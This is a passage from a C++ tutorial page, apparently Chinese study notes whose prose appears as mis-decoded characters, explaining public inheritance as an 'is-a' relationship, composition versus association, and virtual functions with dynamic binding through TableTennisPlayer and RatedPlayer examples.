class="params">(<span class="keyword">const</span> TableTennisPlayer &amp; player)</span> </span>&#123;</span><br><span class="line">    player.Name();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">showPlayerName(ttp); <span class="comment">// ä¼ é€’åŸºç±»å¯¹è±¡ (OK)</span></span><br><span class="line">showPlayerName(rp);  <span class="comment">// ä¼ é€’æ´¾ç”Ÿç±»å¯¹è±¡ (OK, å› ä¸º RatedPlayer is-a TableTennisPlayer)</span></span><br></pre></td></tr></table></figure><p><strong>ä¸å…¶ä»–å…³ç³»çš„å¯¹æ¯”:</strong></p><p>ç»§æ‰¿ï¼ˆç‰¹åˆ«æ˜¯å…¬æœ‰ç»§æ‰¿ï¼‰ä¸å…¶ä»–ç±»ä¹‹é—´çš„å…³ç³»ä¸åŒï¼š</p><ul><li><p><strong>â€œhas-aâ€ å…³ç³» (åŒ…å«/ç»„åˆ - Composition):</strong> ä¸€ä¸ªç±»åŒ…å«å¦ä¸€ä¸ªç±»çš„å¯¹è±¡ä½œä¸ºå…¶æˆå‘˜ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ª <code>Car</code> <strong>æœ‰ä¸€ä¸ª</strong> <code>Engine</code>ã€‚è¿™é€šå¸¸é€šè¿‡å°† <code>Engine</code> å¯¹è±¡ä½œä¸º <code>Car</code> ç±»çš„æ•°æ®æˆå‘˜æ¥å®ç°ã€‚<code>Car</code> ä¸æ˜¯ <code>Engine</code>ï¼Œ<code>Engine</code> ä¹Ÿä¸æ˜¯ <code>Car</code>ã€‚</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Engine</span> &#123;</span> <span class="comment">/* ... */</span> &#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Engine engine_member; <span class="comment">// Car has-a Engine</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p><strong>â€œuses-aâ€ å…³ç³» (ä½¿ç”¨ - Association/Dependency):</strong> ä¸€ä¸ªç±»åœ¨å®ƒçš„æ–¹æ³•ä¸­ä½¿ç”¨äº†å¦ä¸€ä¸ªç±»çš„å¯¹è±¡ï¼ˆä¾‹å¦‚ï¼Œä½œä¸ºå‚æ•°ã€è¿”å›å€¼æˆ–å±€éƒ¨å˜é‡ï¼‰ï¼Œä½†å¹¶ä¸æ‹¥æœ‰å®ƒã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ª <code>Programmer</code> <strong>ä½¿ç”¨ä¸€ä¸ª</strong> <code>Computer</code>ã€‚</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Computer</span> &#123;</span> <span class="comment">/* ... */</span> &#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Programmer</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">writeCode</span><span class="params">(Computer&amp; pc)</span> </span>&#123; <span class="comment">// Programmer uses-a Computer</span></span><br><span class="line">        <span class="comment">// ... ä½¿ç”¨ pc å¯¹è±¡ ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><p><strong>ä¸ºä»€ä¹ˆåŒºåˆ†å¾ˆé‡è¦ï¼Ÿ</strong></p><p>æ­£ç¡®åœ°è¯†åˆ«ç±»ä¹‹é—´çš„å…³ç³»å¹¶é€‰æ‹©åˆé€‚çš„å®ç°æ–¹å¼ï¼ˆå…¬æœ‰ç»§æ‰¿ã€ç§æœ‰ç»§æ‰¿ã€ä¿æŠ¤ç»§æ‰¿ã€ç»„åˆã€å…³è”ï¼‰å¯¹äºè®¾è®¡è‰¯å¥½ã€å¯ç»´æŠ¤çš„é¢å‘å¯¹è±¡ç³»ç»Ÿè‡³å…³é‡è¦ã€‚</p><ul><li>  <strong>å…¬æœ‰ç»§æ‰¿ (<code>public</code>)</strong> åº”è¯¥åªç”¨äºæ¨¡æ‹Ÿ<strong>çœŸæ­£</strong>çš„ â€œis-aâ€ å…³ç³»ã€‚å¦‚æœæ´¾ç”Ÿç±»ä¸èƒ½å®Œå…¨æ›¿ä»£åŸºç±»ï¼ˆå³ä¸ç¬¦åˆ Liskov æ›¿æ¢åŸåˆ™ - Liskov Substitution Principleï¼‰ï¼Œé‚£ä¹ˆä½¿ç”¨å…¬æœ‰ç»§æ‰¿å¯èƒ½æ˜¯ä¸æ°å½“çš„ã€‚</li><li>  å¦‚æœå…³ç³»æ˜¯ â€œhas-aâ€ï¼Œåº”è¯¥ä½¿ç”¨<strong>ç»„åˆ</strong>ï¼ˆæˆå‘˜å¯¹è±¡ï¼‰ã€‚</li><li>  å¦‚æœåªæ˜¯ä¸´æ—¶ä½¿ç”¨ï¼Œåˆ™æ˜¯ â€œuses-aâ€ å…³ç³»ã€‚</li></ul><p><strong>ä¸æ°å½“çš„ â€œis-aâ€ ç¤ºä¾‹:</strong></p><p>å‡è®¾ä½ æƒ³åˆ›å»ºä¸€ä¸ª <code>Square</code> ç±»å’Œä¸€ä¸ª <code>Rectangle</code> ç±»ã€‚ä½ å¯èƒ½ä¼šæƒ³è®© <code>Square</code> ç»§æ‰¿è‡ª <code>Rectangle</code>ï¼Œå› ä¸ºæ­£æ–¹å½¢â€œæ˜¯â€çŸ©å½¢ã€‚ä½†è¿™é‡Œå­˜åœ¨é—®é¢˜ï¼šå¦‚æœ <code>Rectangle</code> æœ‰ <code>setWidth()</code> å’Œ <code>setHeight()</code> æ–¹æ³•ï¼Œå¹¶ä¸”å®ƒä»¬å¯ä»¥ç‹¬ç«‹è®¾ç½®å®½é«˜ï¼Œé‚£ä¹ˆå½“ä½ åœ¨ä¸€ä¸ªè¢«è§†ä¸º <code>Rectangle</code> çš„ <code>Square</code> å¯¹è±¡ä¸Šè°ƒç”¨ <code>setWidth()</code> æ—¶ï¼Œä¸ºäº†ä¿æŒæ­£æ–¹å½¢çš„æ€§è´¨ï¼Œä½ å¯èƒ½éœ€è¦åŒæ—¶ä¿®æ”¹é«˜åº¦ï¼Œè¿™è¿åäº† <code>Rectangle</code> çš„è¡Œä¸ºé¢„æœŸï¼ˆå®½åº¦å’Œé«˜åº¦å¯ä»¥ç‹¬ç«‹è®¾ç½®ï¼‰ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå…¬æœ‰ç»§æ‰¿å¯èƒ½ä¸æ˜¯æœ€ä½³é€‰æ‹©ï¼Œå¯èƒ½éœ€è¦é‡æ–°è€ƒè™‘è®¾è®¡æˆ–ä½¿ç”¨å…¶ä»–ç»§æ‰¿æ–¹å¼ã€‚</p><p><strong>æ€»ç»“:</strong></p><ul><li>  å…¬æœ‰ç»§æ‰¿ (<code>public</code>) å»ºç«‹äº†ä¸€ç§ <strong>â€œis-aâ€</strong> å…³ç³»ï¼Œè¡¨ç¤ºæ´¾ç”Ÿç±»æ˜¯åŸºç±»çš„ä¸€ç§ç‰¹æ®Šç±»å‹ã€‚</li><li>  â€œis-aâ€ å…³ç³»çš„æ ¸å¿ƒæ˜¯æ´¾ç”Ÿç±»ç»§æ‰¿äº†åŸºç±»çš„å…¬æœ‰æ¥å£ï¼Œå› æ­¤å¯ä»¥åƒåŸºç±»å¯¹è±¡ä¸€æ ·è¢«ä½¿ç”¨ã€‚</li><li>  è¿™ä½“ç°åœ¨åŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨å¯ä»¥æŒ‡å‘æˆ–å¼•ç”¨æ´¾ç”Ÿç±»å¯¹è±¡ã€‚</li><li>  åº”å°†å…¬æœ‰ç»§æ‰¿ä¸ â€œhas-aâ€ï¼ˆç»„åˆï¼‰å’Œ â€œuses-aâ€ï¼ˆå…³è”ï¼‰å…³ç³»åŒºåˆ†å¼€ã€‚</li><li>  åªæœ‰åœ¨æ´¾ç”Ÿç±»ç¡®å®ç¬¦åˆåŸºç±»çš„è¡Œä¸ºå¥‘çº¦æ—¶ï¼Œæ‰åº”ä½¿ç”¨å…¬æœ‰ç»§æ‰¿ã€‚</li></ul><h2 id="13-3-å¤šæ€å…¬æœ‰ç»§æ‰¿"><a href="#13-3-å¤šæ€å…¬æœ‰ç»§æ‰¿" class="headerlink" title="13.3 å¤šæ€å…¬æœ‰ç»§æ‰¿"></a>13.3 å¤šæ€å…¬æœ‰ç»§æ‰¿</h2><p>æˆ‘ä»¬å·²ç»çŸ¥é“ï¼Œå…¬æœ‰ç»§æ‰¿å»ºç«‹äº† â€œis-aâ€ å…³ç³»ï¼Œå…è®¸æˆ‘ä»¬ä½¿ç”¨åŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨æ¥æŒ‡å‘æˆ–å¼•ç”¨æ´¾ç”Ÿç±»å¯¹è±¡ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">RatedPlayer <span class="title">rp</span><span class="params">(<span class="string">&quot;May&quot;</span>, <span class="string">&quot;Lee&quot;</span>, <span class="literal">true</span>, <span class="number">1500</span>)</span></span>;</span><br><span class="line">TableTennisPlayer * pt = &amp;rp; <span class="comment">// åŸºç±»æŒ‡é’ˆæŒ‡å‘æ´¾ç”Ÿç±»å¯¹è±¡</span></span><br></pre></td></tr></table></figure><p>ç„¶è€Œï¼Œå½“æˆ‘ä»¬é€šè¿‡åŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨è°ƒç”¨ä¸€ä¸ª<strong>åŒæ—¶å­˜åœ¨äºåŸºç±»å’Œæ´¾ç”Ÿç±»ä¸­</strong>çš„æ–¹æ³•æ—¶ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ï¼Ÿ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pt-&gt;Name(); <span class="comment">// è°ƒç”¨å“ªä¸ª Name() æ–¹æ³•ï¼Ÿ TableTennisPlayer::Name() è¿˜æ˜¯ RatedPlayer::Name()ï¼Ÿ</span></span><br></pre></td></tr></table></figure><p>åœ¨æ²¡æœ‰ç‰¹æ®Šå¤„ç†çš„æƒ…å†µä¸‹ï¼ŒC++ é»˜è®¤ä½¿ç”¨<strong>é™æ€è”ç¼– (Static Binding)</strong> æˆ–<strong>æ—©ç»‘å®š (Early Binding)**ã€‚è¿™æ„å‘³ç€ç¼–è¯‘å™¨åœ¨ç¼–è¯‘æ—¶æ ¹æ®æŒ‡é’ˆæˆ–å¼•ç”¨çš„</strong>é™æ€ç±»å‹**ï¼ˆå£°æ˜çš„ç±»å‹ï¼Œè¿™é‡Œæ˜¯ <code>TableTennisPlayer*</code>ï¼‰æ¥å†³å®šè°ƒç”¨å“ªä¸ªç‰ˆæœ¬çš„æ–¹æ³•ã€‚å› æ­¤ï¼Œå³ä½¿ <code>pt</code> å®é™…æŒ‡å‘ä¸€ä¸ª <code>RatedPlayer</code> å¯¹è±¡ï¼Œ<code>pt-&gt;Name()</code> ä¹Ÿä¼šè°ƒç”¨ <code>TableTennisPlayer::Name()</code>ã€‚</p><p>è¿™é€šå¸¸ä¸æ˜¯æˆ‘ä»¬æœŸæœ›çš„è¡Œä¸ºï¼Œå°¤å…¶æ˜¯åœ¨å¤„ç†ä¸åŒç±»å‹çš„æ´¾ç”Ÿç±»å¯¹è±¡æ—¶ã€‚æˆ‘ä»¬å¸Œæœ›ç¨‹åºèƒ½å¤Ÿåœ¨<strong>è¿è¡Œæ—¶</strong>æ ¹æ®æŒ‡é’ˆæˆ–å¼•ç”¨<strong>å®é™…æŒ‡å‘çš„å¯¹è±¡ç±»å‹</strong>æ¥é€‰æ‹©è°ƒç”¨ç›¸åº”çš„æ–¹æ³•ã€‚è¿™ç§â€œå¤šç§å½¢æ€â€çš„è¡Œä¸ºå°±æ˜¯**å¤šæ€ (Polymorphism)**ã€‚</p><p><strong>å¤šæ€</strong>æ˜¯é¢å‘å¯¹è±¡ç¼–ç¨‹çš„ä¸‰å¤§æ”¯æŸ±ä¹‹ä¸€ï¼ˆå¦å¤–ä¸¤ä¸ªæ˜¯å°è£…å’Œç»§æ‰¿ï¼‰ã€‚å®ƒå…è®¸æˆ‘ä»¬ä»¥ç»Ÿä¸€çš„æ–¹å¼ï¼ˆé€šè¿‡åŸºç±»æ¥å£ï¼‰å¤„ç†ä¸åŒç±»å‹çš„å¯¹è±¡ï¼Œè€Œè¿™äº›å¯¹è±¡å„è‡ªä»¥è‡ªå·±çš„æ–¹å¼å“åº”ç›¸åŒçš„æ¶ˆæ¯ï¼ˆæ–¹æ³•è°ƒç”¨ï¼‰ã€‚</p><p><strong>å¦‚ä½•å®ç°å¤šæ€ï¼Ÿ</strong></p><p>C++ é€šè¿‡ä½¿ç”¨<strong>è™šå‡½æ•° (Virtual Functions)</strong> å’Œ<strong>åŠ¨æ€è”ç¼– (Dynamic Binding)</strong> æˆ–<strong>æ™šç»‘å®š (Late Binding)</strong> æ¥å®ç°å¤šæ€ã€‚</p><p><strong>è™šå‡½æ•° (Virtual Functions):</strong></p><ul><li>  è¦åœ¨æ´¾ç”Ÿç±»ä¸­é‡æ–°å®šä¹‰ï¼ˆè¦†ç›–ï¼‰åŸºç±»çš„æ–¹æ³•ï¼Œå¹¶ä¸”å¸Œæœ›é€šè¿‡åŸºç±»æŒ‡é’ˆ/å¼•ç”¨è°ƒç”¨æ—¶èƒ½å¤Ÿæ‰§è¡Œæ´¾ç”Ÿç±»çš„ç‰ˆæœ¬ï¼Œå°±å¿…é¡»åœ¨<strong>åŸºç±»</strong>ä¸­å°†è¯¥æ–¹æ³•å£°æ˜ä¸º<strong>è™šå‡½æ•°</strong>ã€‚</li><li>  é€šè¿‡åœ¨åŸºç±»æ–¹æ³•å£°æ˜å‰åŠ ä¸Š <code>virtual</code> å…³é”®å­—æ¥å®ç°ã€‚</li></ul><p><strong>ä¿®æ”¹ <code>TableTennisPlayer</code> (tabtenn1.h)</strong></p><p>è®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ–°ç‰ˆæœ¬çš„å¤´æ–‡ä»¶ <code>tabtenn1.h</code>ï¼Œåœ¨å…¶ä¸­å°† <code>Name()</code> æ–¹æ³•å£°æ˜ä¸ºè™šå‡½æ•°ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> TABTENN1_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABTENN1_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; // æ·»åŠ  iostream ä»¥ä¾¿åœ¨å¤´æ–‡ä»¶ä¸­ä½¿ç”¨ cout (è™½ç„¶é€šå¸¸ä¸æ¨è)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// åŸºç±» - ä½¿ç”¨è™šå‡½æ•°</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TableTennisPlayer</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> firstname;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> lastname;</span><br><span class="line">    <span class="keyword">bool</span> hasTable;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    TableTennisPlayer (<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; fn = <span class="string">&quot;none&quot;</span>,</span><br><span class="line">                       <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; ln = <span class="string">&quot;none&quot;</span>,</span><br><span class="line">                       <span class="keyword">bool</span> ht = <span class="literal">false</span>);</span><br><span class="line">    <span class="comment">// å°† Name() å£°æ˜ä¸ºè™šå‡½æ•°</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Name</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">HasTable</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> hasTable; &#125;;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ResetTable</span><span class="params">(<span class="keyword">bool</span> v)</span> </span>&#123; hasTable = v; &#125;;</span><br><span class="line">    <span class="comment">// æ·»åŠ ä¸€ä¸ªè™šææ„å‡½æ•°é€šå¸¸æ˜¯å¥½ä¹ æƒ¯ (ç¨åè§£é‡Š)</span></span><br><span class="line">    <span class="keyword">virtual</span> ~TableTennisPlayer() &#123; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ´¾ç”Ÿç±»</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RatedPlayer</span> :</span> <span class="keyword">public</span> TableTennisPlayer &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> rating;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    RatedPlayer (<span class="keyword">unsigned</span> <span class="keyword">int</span> r = <span class="number">0</span>, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; fn = <span class="string">&quot;none&quot;</span>,</span><br><span class="line">                 <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; ln = <span class="string">&quot;none&quot;</span>, <span class="keyword">bool</span> ht = <span class="literal">false</span>);</span><br><span class="line">    RatedPlayer(<span class="keyword">unsigned</span> <span class="keyword">int</span> r, <span class="keyword">const</span> TableTennisPlayer &amp; tp);</span><br><span class="line">    <span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">Rating</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> rating; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ResetRating</span> <span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> r)</span> </span>&#123; rating = r; &#125;</span><br><span class="line">    <span class="comment">// è¦†ç›–åŸºç±»çš„è™šå‡½æ•° Name()</span></span><br><span class="line">    <span class="comment">// C++11 æ¨èä½¿ç”¨ override å…³é”®å­—æ˜ç¡®è¡¨ç¤ºè¦†ç›–</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Name</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span></span>; <span class="comment">// ä¹Ÿå¯ä»¥åªå†™ virtual void Name() const;</span></span><br><span class="line">                                        <span class="comment">// æˆ– void Name() const; (å¦‚æœåŸºç±»æ˜¯ virtualï¼Œæ´¾ç”Ÿç±»åŒååŒå‚æ–¹æ³•è‡ªåŠ¨ä¹Ÿæ˜¯ virtual)</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// TABTENN1_H_</span></span></span><br></pre></td></tr></table></figure><p><strong>ä¿®æ”¹å®ç° (tabtenn1.cpp)</strong></p><p>æˆ‘ä»¬éœ€è¦æä¾› <code>RatedPlayer::Name()</code> çš„å®ç°ï¼Œå¹¶æ›´æ–°æ„é€ å‡½æ•°ä»¥åŒ¹é…æ–°çš„ç±»åã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;tabtenn1.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// TableTennisPlayer æ–¹æ³•</span></span><br><span class="line">TableTennisPlayer::TableTennisPlayer (<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; fn,</span><br><span class="line">                                      <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; ln, <span class="keyword">bool</span> ht)</span><br><span class="line">                                      : firstname(fn), lastname(ln), hasTable(ht) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TableTennisPlayer::Name</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; lastname &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; firstname;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RatedPlayer æ–¹æ³•</span></span><br><span class="line">RatedPlayer::RatedPlayer(<span class="keyword">unsigned</span> <span class="keyword">int</span> r, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; fn,</span><br><span class="line">                         <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; ln, <span class="keyword">bool</span> ht)</span><br><span class="line">                         : TableTennisPlayer(fn, ln, ht), rating(r) &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">RatedPlayer::RatedPlayer(<span class="keyword">unsigned</span> <span class="keyword">int</span> r, <span class="keyword">const</span> TableTennisPlayer &amp; tp)</span><br><span class="line">                         : TableTennisPlayer(tp), rating(r) &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RatedPlayer è¦†ç›–çš„ Name() æ–¹æ³•å®ç°</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RatedPlayer::Name</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å¯ä»¥è°ƒç”¨åŸºç±»çš„ Name() æ–¹æ³•</span></span><br><span class="line">    TableTennisPlayer::Name();</span><br><span class="line">    <span class="comment">// æ·»åŠ è‡ªå·±çš„è¾“å‡º</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;, Rating: &quot;</span> &lt;&lt; rating;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>åŠ¨æ€è”ç¼– (Dynamic Binding):</strong></p><p>å½“é€šè¿‡<strong>åŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨</strong>è°ƒç”¨ä¸€ä¸ª<strong>è™šå‡½æ•°</strong>æ—¶ï¼Œç¨‹åºä¼šæ ¹æ®æŒ‡é’ˆæˆ–å¼•ç”¨<strong>å®é™…æŒ‡å‘çš„å¯¹è±¡ç±»å‹</strong>æ¥å†³å®šè°ƒç”¨å“ªä¸ªç‰ˆæœ¬çš„æ–¹æ³•ã€‚è¿™ä¸ªå†³å®šæ˜¯åœ¨<strong>è¿è¡Œæ—¶</strong>åšå‡ºçš„ï¼Œå› æ­¤ç§°ä¸ºåŠ¨æ€è”ç¼–æˆ–æ™šç»‘å®šã€‚</p><p><strong>ä½¿ç”¨ç¤ºä¾‹ (usett1.cpp)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;tabtenn1.h&quot;</span> <span class="comment">// ä½¿ç”¨åŒ…å«è™šå‡½æ•°çš„æ–°ç‰ˆæœ¬</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">( <span class="keyword">void</span> )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="function">TableTennisPlayer <span class="title">player1</span><span class="params">(<span class="string">&quot;Tara&quot;</span>, <span class="string">&quot;Boomdea&quot;</span>, <span class="literal">false</span>)</span></span>;</span><br><span class="line">    <span class="function">RatedPlayer <span class="title">rplayer1</span><span class="params">(<span class="number">1140</span>, <span class="string">&quot;Mallory&quot;</span>, <span class="string">&quot;Duck&quot;</span>, <span class="literal">true</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é€šè¿‡å¯¹è±¡ç›´æ¥è°ƒç”¨ï¼Œæ€»æ˜¯è°ƒç”¨å¯¹è±¡æ‰€å±ç±»çš„æ–¹æ³• (é™æ€è”ç¼–)</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Direct call:\n&quot;</span>;</span><br><span class="line">    player1.Name(); <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// è°ƒç”¨ TableTennisPlayer::Name()</span></span><br><span class="line">    rplayer1.Name(); <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// è°ƒç”¨ RatedPlayer::Name()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// é€šè¿‡æŒ‡é’ˆè°ƒç”¨è™šå‡½æ•° (åŠ¨æ€è”ç¼–)</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nUsing pointers to base type:\n&quot;</span>;</span><br><span class="line">    TableTennisPlayer * pt1 = &amp;player1;</span><br><span class="line">    TableTennisPlayer * pt2 = &amp;rplayer1;</span><br><span class="line"></span><br><span class="line">    pt1-&gt;Name(); <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// pt1 æŒ‡å‘ TableTennisPlayer å¯¹è±¡ï¼Œè°ƒç”¨ TableTennisPlayer::Name()</span></span><br><span class="line">    pt2-&gt;Name(); <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// *** pt2 æŒ‡å‘ RatedPlayer å¯¹è±¡ï¼Œè°ƒç”¨ RatedPlayer::Name() ***</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// é€šè¿‡å¼•ç”¨è°ƒç”¨è™šå‡½æ•° (åŠ¨æ€è”ç¼–)</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nUsing references to base type:\n&quot;</span>;</span><br><span class="line">    TableTennisPlayer &amp; rt1 = player1;</span><br><span class="line">    TableTennisPlayer &amp; rt2 = rplayer1;</span><br><span class="line"></span><br><span class="line">    rt1.Name(); <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// rt1 å¼•ç”¨ TableTennisPlayer å¯¹è±¡ï¼Œè°ƒç”¨ TableTennisPlayer::Name()</span></span><br><span class="line">    rt2.Name(); <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>; 